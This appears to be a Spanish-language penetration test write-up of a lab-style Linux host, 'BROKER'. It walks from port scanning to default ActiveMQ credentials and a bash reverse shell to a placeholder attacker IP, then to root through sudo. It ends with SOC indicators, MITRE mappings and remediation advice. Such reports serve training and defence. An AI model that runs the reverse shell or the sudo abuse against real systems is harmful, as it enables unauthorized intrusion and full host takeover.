# Informe de Seguridad - Evaluación de Host "BROKER"

## 1. Resumen Ejecutivo

Se ha realizado una evaluación de seguridad sobre el host "BROKER", identificado como un sistema Linux con servicios expuestos.

Durante el análisis se identificó un panel de Apache ActiveMQ accesible con credenciales débiles, lo que permitió obtener acceso inicial al sistema. Posteriormente, mediante abuso de permisos sudo, se logró escalar privilegios hasta root.

### Impacto

- Acceso inicial no autorizado  
- Ejecución remota de comandos  
- Escalada de privilegios  
- Compromiso total del sistema  

### Nivel de riesgo: **CRÍTICO**

---

## 2. Alcance

- Objetivo: BROKER  
- Sistema: Linux  
- Tipo de prueba: Black Box  
- Metodología: Enumeración → Explotación → Escalada  

---

## 3. Enumeración

### 3.1 Escaneo de puertos

    nmap -p- -sS --min-rate 5000 -Pn <IP>

### Resultados relevantes:

- 22 – SSH  
- 8161 – Apache ActiveMQ Web Console  

---

### 3.2 Enumeración de servicios

Acceso web:

    http://<IP>:8161

Hallazgos:

- Panel accesible  
- Credenciales por defecto: admin:admin  

---

## 4. Explotación (Acceso inicial)

### 4.1 Vulnerabilidad

- Apache ActiveMQ RCE  
- Credenciales débiles  

---

### 4.2 Reverse shell

Listener:

    nc -lvnp 4444

Payload:

    bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1

Resultado:

- Acceso como usuario: activemq  

---

## 5. Escalada de privilegios

### 5.1 Enumeración

    sudo -l

---

### 5.2 Explotación

    sudo /bin/bash

Resultado:

    uid=0(root)

---

## 6. Evidencias

- Acceso vía panel web  
- Shell reversa  
- Escalada a root  

---

## 7. Visión SOC

### IoC

- Acceso HTTP al puerto 8161  
- Uso de credenciales por defecto  
- Reverse shell  
- Ejecución de bash desde servicio  

---

### Logs

    /opt/activemq/data/activemq.log
    /var/log/syslog
    /var/log/auth.log

---

### MITRE ATT&CK

- T1190 – Exploit Public-Facing Application  
- T1059 – Command Execution  
- T1078 – Valid Accounts  
- T1068 – Privilege Escalation  

---

## 8. Recomendaciones

- Cambiar credenciales por defecto  
- Restringir acceso al panel  
- Revisar sudo  
- Monitorizar ejecución de comandos  

---

## 9. Conclusión

Cadena de ataque:

1. Acceso al panel  
2. Credenciales débiles  
3. RCE  
4. Reverse shell  
5. Escalada  

Compromiso total del sistema.
